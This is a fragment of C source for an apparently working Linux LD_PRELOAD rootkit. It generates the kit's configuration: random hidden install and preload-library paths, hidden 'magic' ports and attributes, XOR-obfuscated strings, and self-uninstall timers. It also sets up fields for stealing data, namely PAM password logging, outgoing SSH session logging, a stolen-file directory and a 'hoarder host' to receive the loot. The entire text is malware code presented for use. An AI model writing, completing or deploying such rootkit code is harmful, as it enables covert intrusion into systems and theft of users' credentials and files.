/* to DEST in BC, copy - up to DSIZE bytes from - the result of calling FN with given extra parameters passed to this function.
 * DEST is xor'd on success. BC is only passed to this in case of failure - so the pointer can be freed before returning NULL. */
#define _getvar(BC,DEST,DSIZE,FN,...) do{ \
    usleep(75000); \
    char *res = FN(__VA_ARGS__); \
    if(!res){ \
        bree(BC); \
        return NULL; \
    } \
    memset(DEST, 0, DSIZE); \
    strncpy(DEST, res, DSIZE); \
    clean(res); \
    xor(DEST); \
} while(0)
#define getvar(BC,DEST,FN,...) _getvar(BC,DEST,sizeof(DEST),FN,__VA_ARGS__) // if DEST is given explicitly, this is the one to use.
#define getrandpath(BC,DEST)   _getvar(BC,DEST,PATHMAX,randpath,_randnum(14,18),NULL)

void __attribute((visibility("hidden"))) inithideports(bdvcfg_t *bc){
    for(size_t i = 0; i < MAX_HIDE_PORTS; i++)
        bc->hideports[i] = 0;

    size_t psize = DEFAULT_MAGIC_PORTS_SIZE > MAX_HIDE_PORTS ? MAX_HIDE_PORTS : DEFAULT_MAGIC_PORTS_SIZE;

#ifdef ACCEPT_HOOK_PORT
    for(size_t i = 0; i < psize; i++)
        if(i != MAX_HIDE_PORTS-1)
            bc->hideports[i+1] = default_magic_ports[i];
    bc->hideports[0] = ACCEPT_HOOK_PORT;
    bc->portcount = psize+1;
#else
    for(size_t i = 0; i < psize; i++)
        bc->hideports[i] = default_magic_ports[i];
    bc->portcount = psize;
#endif
}

/* initialise all time_t values in given bdvcfg_t pointer, to value t. */
void inittimes(bdvcfg_t *bc, const time_t t){
    time_t *const bimes[] = {
        #ifdef GID_CHANGE_MINTIME
         &bc->idchangetime,
        #endif
        #if defined USE_MAGIC_ATTR && defined ATTR_CHANGE_TIME
         &bc->attrchangetime,
        #endif
        #if defined ENABLE_STEAL && defined FILE_CLEANSE_TIMER
         &bc->filecleantime,
        #endif
         &bc->installtime
    };

    for(size_t i=0; i<sizeofarr(bimes); i++)
        *bimes[i]=t;

    /* initialising this here feels suitable. */
#ifdef AFTER_HOURS
    bc->uninstallwhen = AFTER_HOURS;
#elif defined AFTER_DAYS
    bc->uninstallwhen = AFTER_DAYS;
#endif
}


/* get all random & specifically unimportant paths for the kit.
 * NULL is returned on failure. on success the given pointer is returned. */
const bdvcfg_t *getbdvpaths(bdvcfg_t *bc){
    char *const randdests[] = {
        #ifdef OUTGOING_SSH_LOGGING
         bc->sshlogs,
        #endif
        #ifdef ENABLE_STEAL
         bc->interestdir,
        #endif
        #ifdef PAM_AUTH_LOGGING
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir,
         bc->homedir
    };

    for(size_t i=0; i<sizeofarr(randdests); i++)
        getrandpath(bc, randdests[i]);
    return bc;
}

/* the result of this is a fresh bdvcfg_t pointer, for immediate writing by writebdvcfg. */
const bdvcfg_t *getbdvcfg(void){
    bdvcfg_t *ret = calloc(1, sizeof(bdvcfg_t));
    if(!ret) return NULL;
    srand(time(NULL));

    if(getbdvpaths(ret) == NULL)
        return NULL; // ret pointer has already been freed before now if failure.

    getvar(ret, ret->bdvlso, randso, ret->installdir);
    getvar(ret, ret->bdvar, randvar, 16);
#ifdef PATCH_LD
    getvar(ret, ret->preloadpath, randpath, 18, "/lib");
#else
    getvar(ret, ret->preloadpath, xordup, OLD_PRELOAD);
#endif
#ifdef HOARDER_HOST
    getvar(ret, ret->hoarder_host, xordup, HOARDER_HOST);
#endif
#ifdef USE_MAGIC_ATTR
    getvar(ret, ret->magicattr, randgarb, MAGIC_ATTR_LENGTH);
#endif

    ret->magicid = randid();
    inittimes(ret, time(NULL));
    inithideports(ret);
    return ret;
}